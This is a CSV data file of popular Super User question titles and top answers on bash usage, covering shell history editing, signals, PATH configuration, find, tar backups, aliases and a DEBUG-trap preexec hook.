Title,Id,Tags,Score,Body
"I accidentally typed password into bash command line","736635","<linux><command-line><bash><centos>","197","<p>You can remove just the offending line from <code>bash</code>'s history, instead of clearing the entire history. Simply remove the line with the <code>-d</code> flag, then save (write) the new history with the <code>-w</code> flag:</p>

<pre><code>$ history
351 ssh me@site.com
352 my_password
$ history -d 352
$ history -w
</code></pre>
"
"What to do when Ctrl + C can't kill a process?","243460","<linux><bash><shell>","193","<p>To understand the problem of why <kbd>Ctrl</kbd> + <kbd>C</kbd> does not work, it is very helpful to understand what happens when you press it:</p>

<p>Most shells bind <kbd>Ctrl</kbd> + <kbd>C</kbd> to ""send a <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGINT"" rel=""noreferrer"">SIGINT</a> signal to the program that currently runs in the foreground"". You can read about the different signals via <a href=""http://man.cx/signal(7)"" rel=""noreferrer"">man signal</a>:</p>

<pre><code> SIGINT        2       Term    Interrupt from keyboard
</code></pre>

<p>Programs can ignore that signal, as they can ignore <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGTSTP"" rel=""noreferrer"">SIGTSTP</a> as well:</p>

<pre><code> SIGTSTP   18,20,24    Stop    Stop typed at tty
</code></pre>

<p>(Which is what most shells do when you press <kbd>Ctrl</kbd> + <kbd>Z</kbd>, which is why it is not guaranteed to work.)</p>

<p>There are some signals which can not be ignored by the process: <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGKILL"" rel=""noreferrer"">SIGKILL</a>, <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGSTOP"" rel=""noreferrer"">SIGSTOP</a> and some others. You can send these signals via the <a href=""http://man.cx/kill"" rel=""noreferrer"">kill</a> command. So, to kill your hanging / zombieying process, just find the <a href=""http://en.wikipedia.org/wiki/Process_identifier"" rel=""noreferrer"">process ID</a> (PID). For example, use <code>pgrep</code> or <code>ps</code> and then <code>kill</code> it:</p>

<pre><code> % kill -9 PID
</code></pre>
"
"What does the 'rc' in `.bashrc`, etc. mean?","173165","<linux><unix><bash><bashrc>","192","<p>It stands for “<a href=""http://en.wikipedia.org/wiki/Run_Commands"">run commands</a>”.</p>

<p>This comes from <a href=""http://en.wikipedia.org/wiki/MIT"">MIT</a>’s <a href=""http://en.wikipedia.org/wiki/Compatible_Time-Sharing_System"">CTSS (Compatible Time-Sharing System)</a> and <a href=""http://en.wikipedia.org/wiki/Multics"">Multics</a>, where the idea that a command processing shell would be an ordinary program originated. CTSS had a program called RUNCOM (for “run commands”) and a script was called “a runcom” in the community where Unix originated, leading to the file extension <code>.rc</code> and generally to the <code>rc</code> abbreviation.</p>

<p><code>rc</code> stuck as a name for any list of commands.</p>
"
"How to access Windows folders from Bash on Ubuntu on Windows","1066261","<windows-10><bash><shell><windows-subsystem-for-linux>","166","<p>You'll find the Windows <code>C:\</code> structure at <code>/mnt/c/</code> in the Bash environment.</p>

<p>Therefore, my Documents folder is at <code>/mnt/c/Users/Ben/Documents/</code>.</p>
"
"Is it possible to `tail -f` the output of `dmesg`?","289239","<bash><command-line><tail>","160","<p>You are probably looking for some combination of messages from various log files. Try:</p>

<pre><code>tail -f /var/log/{messages,kernel,dmesg,syslog}
</code></pre>

<p>…to get a pretty good overview of the system. If you want more or less than that, research what log file the messages you want to see are being placed in.</p>

<p>Also look into using <code>multitail</code> to file and color code and filter multiple log files at once.</p>

<p><strong>Edit:</strong> This wasn't very relevant when I answered this, but as this page gets a lot of hits I'm thought it worth mentioning that newer systems running systemd have this.</p>

<pre><code>dmesg -w
</code></pre>
"
"Remove a certain line from Bash history file","384366","<linux><bash><history><command-history>","160","<p>You need to log out and back in or run <code>history -a</code> so the current history is committed to disk.</p>

<p>Then just edit the file <code>~/.bash_history</code>.</p>
"
"Linux Bash Script, Single Command But Multiple Lines?","508507","<linux><bash><script><tar>","159","<p>All you should need to do is add ""\"" at the end of each line and it should be good to go.</p>

<p>So yours will look like:</p>

<pre><code>tar -cvpzf /share/Recovery/Snapshots/$(hostname)_$(date +%Y%m%d).tar.gz \
    --exclude=/proc \
    --exclude=/lost+found \
    --exclude=/sys \
    --exclude=/mnt \
    --exclude=/media \ 
    --exclude=/dev \
    --exclude=/share/Archive \
    /
</code></pre>

<h3>A Few Shortcuts</h3>

<p>(based on your comment update for setting $HOSTNAME)</p>

<p><strong><code>$HOSTNAME</code></strong></p>

<p>Two options to set that:</p>

<ol>
<li><p>Set HOSTNAME</p>

<blockquote>
  <p>HOSTNAME=$(hostname)</p>
</blockquote></li>
<li><p>Use command substitution (e.g. <code>$(command)</code>)</p>

<p>So it would look like above.  That just makes the command run before using it.</p></li>
</ol>

<p><strong><code>$DATE</code></strong></p>

<p>Another variable avoided would be easily:</p>

<pre><code>$(hostname)_$(date +%Y%m%d).tar.gz \
</code></pre>

<p><code>$ man date</code> will have the formats for the date options, the above is YYYYmmdd</p>
"
"How to ignore certain filenames using ""find""?","397307","<bash><find><regex>","158","<p>You can use the negate (!) feature of find to not match files with specific names:</p>

<pre><code>find . ! -name '*.html' ! -path '*.svn*' -exec grep 'SearchString' {} /dev/null \;
</code></pre>

<p>So if the name ends in .html or contains .svn anywhere in the path, it will not match, and so the exec will not be executed.</p>
"
"Execute a command from another directory in bash","271986","<bash>","154","<p>This is often the best way:</p>

<pre><code>( cd dir ; git init )
</code></pre>

<p>or</p>

<pre><code>( cd dir &amp;&amp; git init )
</code></pre>

<p>It's pretty short and easy to type. It does start a sub-shell, so you can't modify your environment from that, but that doesn't seem to be an issue here.</p>
"
"Case insensitive tab completion in Bash","90196","<macos><command-line><bash><shell>","150","<p>Update the text in <code>/etc/inputrc</code> to include</p>

<pre>set completion-ignore-case on</pre>

<p>Then use <code>^X ^R</code> to reload the configuration.</p>
"
"Where does $PATH get set in OS X 10.6 Snow Leopard?","69130","<macos><command-line><osx-snow-leopard><bash><path>","144","<p>When <code>bash</code> starts it reads the following files every time you login. For the purposes of OS X, this means every time you open a new <code>Terminal</code> window.</p>

<pre><code>/etc/profile
~/.bash_profile
~/.bash_login   (if .bash_profile does not exist)
~/.profile      (if .bash_login does not exist)
</code></pre>

<p>When you start a new shell by typing <code>bash</code> on the command line, it reads <code>.bashrc</code></p>

<p>OS X also uses <a href=""http://developer.apple.com/mac/library/qa/qa2001/qa1067.html""><code>~/.MacOSX/environment.plist</code></a> to set more environment variables, including paths if necessary.</p>

<p>Finally, <code>/etc/paths</code> and <code>/etc/paths.d</code> are read by the shell too.</p>

<hr>

<p><code>/opt/local/bin</code> etc. are added in <code>~/.tcshrc</code> by MacPorts. Also be sure to look in <code>~/.cshrc</code>.</p>
"
"Add directory to $PATH if it's not already there","39751","<bash><script><path>","140","<p>From my .bashrc:</p>

<pre><code>pathadd() {
    if [ -d ""$1"" ] &amp;&amp; [[ "":$PATH:"" != *"":$1:""* ]]; then
        PATH=""${PATH:+""$PATH:""}$1""
    fi
}
</code></pre>

<p>Note that PATH should already be marked as exported, so reexporting is not needed.  This checks whether the directory exists &amp; is a directory before adding it, which you may not care about.</p>

<p>Also, this adds the new directory to the end of the path; to put at the beginning, use <code>PATH=""$1${PATH:+"":$PATH""}""</code> instead of the above <code>PATH=</code> line.</p>
"
"How to use spaces in a bash alias name?","105375","<unix><bash><alias>","136","<p>The <a href=""https://www.gnu.org/software/bash/manual/bash.html#Aliases"">Bash documentation</a> states ""For almost every purpose, shell functions are preferred over aliases."" Here is a shell function that replaces <code>ls</code> and causes output to be piped to <code>more</code> if the argument consists of (only) <code>-la</code>.</p>

<pre><code>ls() {
    if [[ $@ == ""-la"" ]]; then
        command ls -la | more
    else
        command ls ""$@""
    fi
}
</code></pre>

<p>As a one-liner:</p>

<pre><code>ls() { if [[ $@ == ""-la"" ]]; then command ls -la | more; else command ls ""$@""; fi; }
</code></pre>

<p>Automatically pipe output:</p>

<pre><code>ls -la
</code></pre>
"
"How to configure PuTTY so that Home/End/PgUp/PgDn work properly in bash?","94436","<bash><putty>","134","<p>Change the Terminal-type String under the Connection > Data tab from the default “xterm” to “linux”. It worked for me.</p>

<p><img src=""https://i.stack.imgur.com/hAIGk.png"" alt=""enter image description here""></p>
"
"How to delete all files in a directory except some?","529854","<linux><bash><rm>","125","<p>What I do in those cases is to type</p>

<pre><code>rm *
</code></pre>

<p>Then I press <kbd>Ctrl</kbd>+<kbd>X</kbd>,<kbd>*</kbd> to <em>expand</em> <code>*</code> into all visible file names.</p>

<p>Then I can just remove the two files I like to keep from the list and finally execute the command line.</p>
"
"Bash scripting: test for empty directory","352289","<bash>","124","<pre><code>if [ -z ""$(ls -A /path/to/dir)"" ]; then
   echo ""Empty""
else
   echo ""Not Empty""
fi
</code></pre>

<p>Also, it would be cool to check if the directory exists before.</p>
"
"How do I make Bash my default shell on Ubuntu?","46748","<ubuntu><bash><ssh>","124","<p>Use:</p>

<pre><code>chsh
</code></pre>

<p>Enter your password and state the path to the shell you want to use.</p>

<p>For Bash that would be <code>/bin/bash</code>.
For Zsh that would be <code>/usr/bin/zsh</code>.</p>
"
"Does bash have a hook that is run before executing a command?","175799","<command-line><bash><hook>","124","<p>Not natively, but it can be hacked up using the <code>DEBUG</code> trap. <a href=""http://www.twistedmatrix.com/users/glyph/preexec.bash.txt"" rel=""noreferrer"">This code</a> sets up <code>preexec</code> and <code>precmd</code> functions similar to zsh. The command line is passed as a single argument to <code>preexec</code>.</p>

<p>Here is a simplified version of the code to set up a <code>precmd</code> function that is executed before running each command.</p>

<pre><code>preexec () { :; }
preexec_invoke_exec () {
    [ -n ""$COMP_LINE"" ] &amp;&amp; return  # do nothing if completing
    [ ""$BASH_COMMAND"" = ""$PROMPT_COMMAND"" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND
    local this_command=`HISTTIMEFORMAT= history 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//""`;
    preexec ""$this_command""
}
trap 'preexec_invoke_exec' DEBUG
</code></pre>

<p>This trick is due to <a href=""http://glyf.livejournal.com/63106.html"" rel=""noreferrer"">Glyph Lefkowitz</a>; thanks to <a href=""https://superuser.com/users/9463/bcat"">bcat</a> for locating the original author.</p>

<p>Edit. An updated version of Glyph's hack can be found here: <a href=""https://github.com/rcaloras/bash-preexec"" rel=""noreferrer"">https://github.com/rcaloras/bash-preexec</a></p>
"
